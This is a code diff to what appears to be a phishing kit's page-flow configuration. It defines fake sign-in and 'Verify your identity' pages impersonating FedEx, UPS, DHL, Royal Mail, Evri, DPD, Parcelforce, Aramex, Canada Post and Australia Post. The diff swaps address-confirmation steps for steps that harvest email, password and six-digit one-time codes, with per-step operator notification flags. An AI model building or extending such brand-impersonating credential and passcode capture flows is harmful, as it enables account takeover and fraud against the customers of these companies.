@@ -660,54 +660,45 @@ const FLOWS = {
 
   // ── SHIPPING ────
   fedex: [
-    { slug:'login',          form_type:'login',  page_title:'Sign In',           headline:'Sign in to FedEx',                   subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',     step_label:'Login',    notify_step:true },
-    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',   headline:'Confirm Delivery Address',            subheadline:'Confirm or update the delivery address', fields:['address','city','state','zip'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
-    { slug:'confirm',        form_type:'confirm',page_title:'Delivery Confirmed',headline:'Your Shipment Has Been Updated',       subheadline:'Your package delivery preferences have been saved', fields:[], layout:'confirm', cta:'View Status', step_label:'Complete', notify_step:false }
+    { slug:'email',    form_type:'login', page_title:'Log In — FedEx', headline:'Log in to FedEx', subheadline:'', fields:['email'], layout:'auth', cta:'Continue', step_label:'Email', notify_step:true },
+    { slug:'password', form_type:'login', page_title:'Log In — FedEx', headline:'Log in to FedEx', subheadline:'', fields:['password'], layout:'auth', cta:'Log In', step_label:'Password', notify_step:true },
+    { slug:'verify',   form_type:'otp',   page_title:'Verify Your Identity', headline:'Verify Your Identity', subheadline:'We sent a one-time passcode to your email address. Please enter it below.', fields:['code'], layout:'otp', cta:'Continue', step_label:'Passcode', notify_step:true, otp_length:6 }
   ],
   ups: [
-    { slug:'login',          form_type:'login',  page_title:'Sign In',           headline:'Sign in to UPS',                     subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',      step_label:'Login',    notify_step:true },
-    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',   headline:'Confirm Your Delivery Address',        subheadline:'Verify your delivery address for this shipment', fields:['address','city','state','zip'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
-    { slug:'confirm',        form_type:'confirm',page_title:'Request Submitted', headline:'Your Delivery Request Was Submitted',  subheadline:'', fields:[], layout:'confirm', cta:'Track Package', step_label:'Complete', notify_step:false }
+    { slug:'login',  form_type:'login', page_title:'Log In — UPS', headline:'Log In', subheadline:'', fields:['user_id','password'], layout:'auth', cta:'Log In', step_label:'Login', notify_step:true },
+    { slug:'verify', form_type:'otp',   page_title:'Verify Your Identity', headline:'Verify Your Identity', subheadline:'For your security, we need to verify your identity. Enter the one-time PIN we sent to your phone.', fields:['code'], layout:'otp', cta:'Verify', step_label:'PIN', notify_step:true, otp_length:6 }
   ],
   dhl: [
-    { slug:'login',          form_type:'login',  page_title:'Sign In',           headline:'Sign in to MyDHL+',                  subheadline:'', fields:['email','password'], layout:'auth',   cta:'Log In',       step_label:'Login',    notify_step:true },
-    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',   headline:'Confirm Delivery Address',            subheadline:'', fields:['address','city','postal','country'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
-    { slug:'confirm',        form_type:'confirm',page_title:'Request Confirmed', headline:'Your Request Has Been Received',       subheadline:'DHL will attempt delivery to your updated address', fields:[], layout:'confirm', cta:'Track Parcel', step_label:'Complete', notify_step:false }
+    { slug:'login',  form_type:'login', page_title:'Login — DHL', headline:'Log in to MyDHL+', subheadline:'', fields:['email','password'], layout:'auth', cta:'Log in', step_label:'Login', notify_step:true },
+    { slug:'verify', form_type:'otp',   page_title:'Verify your identity', headline:'Verify your identity', subheadline:'Enter the 6-digit code sent to your registered mobile number.', fields:['code'], layout:'otp', cta:'Verify', step_label:'Code', notify_step:true, otp_length:6 }
   ],
   royalmail: [
-    { slug:'login',          form_type:'login',  page_title:'Sign In',           headline:'Sign in to Royal Mail',              subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',      step_label:'Login',    notify_step:true },
-    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',   headline:'Confirm Your Address',                subheadline:'Enter your address to manage your delivery', fields:['address','city','postcode'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
-    { slug:'confirm',        form_type:'confirm',page_title:'Request Submitted', headline:'Your Request Has Been Submitted',     subheadline:'', fields:[], layout:'confirm', cta:'Track Item', step_label:'Complete', notify_step:false }
+    { slug:'login',  form_type:'login', page_title:'Sign in — Royal Mail', headline:'Sign in to your account', subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign in', step_label:'Login', notify_step:true },
+    { slug:'verify', form_type:'otp',   page_title:'Verify your identity', headline:'Verify your identity', subheadline:'We sent a verification code to your mobile number ending in ••••.', fields:['code'], layout:'otp', cta:'Continue', step_label:'Code', notify_step:true, otp_length:6 }
   ],
   hermesevri: [
-    { slug:'login',          form_type:'login',  page_title:'Sign In',       headline:'Sign in to Evri',                    subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',      step_label:'Login',    notify_step:true },
-    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',headline:'Update Delivery Address',             subheadline:'', fields:['address','city','postcode'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
-    { slug:'confirm',        form_type:'confirm',page_title:'Updated',        headline:'Delivery Address Updated',            subheadline:'', fields:[], layout:'confirm', cta:'Track Parcel', step_label:'Complete', notify_step:false }
+    { slug:'login',  form_type:'login', page_title:'Sign In — Evri', headline:'Sign in to Evri', subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'verify', form_type:'otp',   page_title:'Verify your identity', headline:'Verify your identity', subheadline:'We sent a verification code to your mobile number ending in ••••.', fields:['code'], layout:'otp', cta:'Continue', step_label:'Code', notify_step:true, otp_length:6 }
   ],
   dpd: [
-    { slug:'login',          form_type:'login',  page_title:'Sign In',       headline:'Sign in to DPD',                     subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',      step_label:'Login',    notify_step:true },
-    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',headline:'Confirm Delivery Address',            subheadline:'', fields:['address','city','postcode'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
-    { slug:'confirm',        form_type:'confirm',page_title:'Confirmed',      headline:'Your Preferences Have Been Saved',    subheadline:'', fields:[], layout:'confirm', cta:'Track Parcel', step_label:'Complete', notify_step:false }
+    { slug:'login',  form_type:'login', page_title:'Sign In — DPD', headline:'Sign in to DPD', subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'verify', form_type:'otp',   page_title:'Verify your identity', headline:'Verify your identity', subheadline:'Enter the 6-digit code sent to your registered mobile number.', fields:['code'], layout:'otp', cta:'Verify', step_label:'Code', notify_step:true, otp_length:6 }
   ],
   parcelforce: [
-    { slug:'login',          form_type:'login',  page_title:'Sign In',       headline:'Sign in to Parcelforce Worldwide',   subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',      step_label:'Login',    notify_step:true },
-    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',headline:'Confirm Your Delivery Address',       subheadline:'', fields:['address','city','postcode'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
-    { slug:'confirm',        form_type:'confirm',page_title:'Confirmed',      headline:'Delivery Options Updated',            subheadline:'', fields:[], layout:'confirm', cta:'Track Parcel', step_label:'Complete', notify_step:false }
+    { slug:'login',  form_type:'login', page_title:'Sign In — Parcelforce', headline:'Sign in to Parcelforce Worldwide', subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'verify', form_type:'otp',   page_title:'Verify your identity', headline:'Verify your identity', subheadline:'Enter the one-time code sent to your registered mobile.', fields:['code'], layout:'otp', cta:'Continue', step_label:'Code', notify_step:true, otp_length:6 }
   ],
   aramex: [
-    { slug:'login',          form_type:'login',  page_title:'Sign In',       headline:'Sign in to Aramex',                  subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',       step_label:'Login',    notify_step:true },
-    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',headline:'Update Delivery Address',             subheadline:'', fields:['address','city','country'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
-    { slug:'confirm',        form_type:'confirm',page_title:'Confirmed',      headline:'Your Address Has Been Updated',       subheadline:'', fields:[], layout:'confirm', cta:'Track Shipment', step_label:'Complete', notify_step:false }
+    { slug:'login',  form_type:'login', page_title:'Sign In — Aramex', headline:'Sign in to Aramex', subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'verify', form_type:'otp',   page_title:'Verify your identity', headline:'Verify your identity', subheadline:'Enter the 6-digit code sent to your mobile number.', fields:['code'], layout:'otp', cta:'Verify', step_label:'Code', notify_step:true, otp_length:6 }
   ],
   canadapost: [
-    { slug:'login',          form_type:'login',  page_title:'Sign In',       headline:'Sign in to Canada Post',             subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',       step_label:'Login',    notify_step:true },
-    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',headline:'Confirm Delivery Address',            subheadline:'', fields:['address','city','province','postal'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
-    { slug:'confirm',        form_type:'confirm',page_title:'Request Submitted',headline:'Your Request Has Been Submitted',  subheadline:'', fields:[], layout:'confirm', cta:'Track Package', step_label:'Complete', notify_step:false }
+    { slug:'login',  form_type:'login', page_title:'Sign In — Canada Post', headline:'Sign in to Canada Post', subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'verify', form_type:'otp',   page_title:'Verify your identity', headline:'Verify your identity', subheadline:'Enter the 6-digit code sent to your registered mobile number.', fields:['code'], layout:'otp', cta:'Continue', step_label:'Code', notify_step:true, otp_length:6 }
   ],
   australiapost: [
-    { slug:'login',          form_type:'login',  page_title:'Sign In',       headline:'Sign in to Australia Post',          subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',       step_label:'Login',    notify_step:true },
-    { slug:'verify-address', form_type:'verify', page_title:'Confirm Address',headline:'Confirm Delivery Address',            subheadline:'', fields:['address','suburb','state','postcode'], layout:'verify', cta:'Confirm', step_label:'Address', notify_step:true },
-    { slug:'confirm',        form_type:'confirm',page_title:'Confirmed',      headline:'Your Delivery Has Been Updated',      subheadline:'', fields:[], layout:'confirm', cta:'Track Parcel', step_label:'Complete', notify_step:false }
+    { slug:'login',  form_type:'login', page_title:'Sign In — Australia Post', headline:'Sign in to Australia Post', subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'verify', form_type:'otp',   page_title:'Verify your identity', headline:'Verify your identity', subheadline:'Enter the 6-digit code sent to your registered mobile number.', fields:['code'], layout:'otp', cta:'Continue', step_label:'Code', notify_step:true, otp_length:6 }
   ],
 
   // ── INSURANCE ────
